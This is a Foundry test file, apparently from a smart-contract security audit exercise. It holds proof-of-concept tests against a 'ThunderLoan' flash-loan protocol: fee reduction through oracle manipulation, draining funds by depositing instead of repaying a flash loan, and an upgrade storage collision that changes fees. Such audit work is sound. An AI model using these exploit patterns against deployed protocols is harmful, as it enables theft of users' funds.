// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { MockFlash2 } from "../mocks/MockFlash2.sol";
import { MockFlash3 } from "../mocks/Mock3Flash.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract BuffTest is Test {
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;
    ThunderLoanUpgraded superThunder;
    //////////////////////////////////
    BuffMockPoolFactory buffFactory;
    BuffMockTSwap buffTSwap;
    MockFlashLoanReceiver receiver;
    MockFlash2 receiver2;
    MockFlash3 receiver3;

    ERC20Mock weth;
    ERC20Mock tokenA;

    address lprovider = address(1);
    address user = address(2);

    function setUp() public {
        weth = new ERC20Mock();
        tokenA = new ERC20Mock();
        weth.mint(address(lprovider), 1000e18);
        tokenA.mint(address(lprovider), 1000e18);
        buffFactory = new BuffMockPoolFactory(address(weth));
        buffTSwap = BuffMockTSwap(buffFactory.createPool(address(tokenA)));
        // console.log(address(buffTSwap));
        vm.startPrank(lprovider);
        weth.approve(address(buffTSwap), 1000e18);
        tokenA.approve(address(buffTSwap), 1000e18);
        buffTSwap.deposit(1000e18, 0, 1000e18, uint64(block.timestamp));
        vm.stopPrank();
        ////////////////////////////////////////////////////////////////////
        thunderLoan = new ThunderLoan();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(buffFactory));

        /////////////////////////////////////////////////////////////
    }
    ////////////////////////////////////////////////////////////////////////////

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    ///////////////////////////////////////////////////////////////////////////

    function testOracleTrick() public setAllowedToken {
        vm.startPrank(lprovider);
        tokenA.mint(address(lprovider), 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        /////////////////////////////////////////////
        vm.startPrank(user);
        receiver2 = new MockFlash2(address(thunderLoan));
        receiver = new MockFlashLoanReceiver(address(thunderLoan), address(buffTSwap), tokenA, weth, address(receiver2));
        tokenA.mint(address(receiver2), 10e18);

        tokenA.mint(address(receiver), 10e18);
        console.log("Fee for first loan is %e", thunderLoan.getCalculatedFee(tokenA, 500e18));
        //1494010471559854824
        uint256 firstFee = thunderLoan.getCalculatedFee(tokenA, 500e18);
        thunderLoan.flashloan(address(receiver), tokenA, 500e18, "");
        uint256 secondFee = 10e18 - tokenA.balanceOf(address(receiver2));

        //  thunderLoan.flashloan(address(receiver), tokenA, 500e18, "");

        console.log("Fee for second loan is ", secondFee);
        vm.stopPrank();
        assert(firstFee > secondFee);
    }

    function testStealWithDepositInsteadRepay() public setAllowedToken {
        vm.startPrank(lprovider);
        tokenA.mint(address(lprovider), 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        vm.startPrank(user);
        receiver3 = new MockFlash3(address(thunderLoan), tokenA);
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, 500e18);
        tokenA.mint(address(receiver3), fee);
        thunderLoan.flashloan(address(receiver3), tokenA, 500e18, "");
        receiver3.steal();
        console.log("Balance of evil Contract %e", tokenA.balanceOf(address(receiver3)));
        console.log("Amount of loan + fee %e", 500e18 + fee);
        assert(tokenA.balanceOf(address(receiver3)) > 500e18 + fee);
    }

    function testCollision() public {
        uint256 loanFee1 = thunderLoan.getFee();

        vm.startPrank(thunderLoan.owner());
        superThunder = new ThunderLoanUpgraded();

        thunderLoan.upgradeToAndCall(address(superThunder), "");

        uint256 loanFee2 = thunderLoan.getFee();
        vm.stopPrank();
        console.log("Fee1 %e :", loanFee1);
        console.log("Fee2 %e :", loanFee2);
        assert(loanFee1 < loanFee2);
    }
}
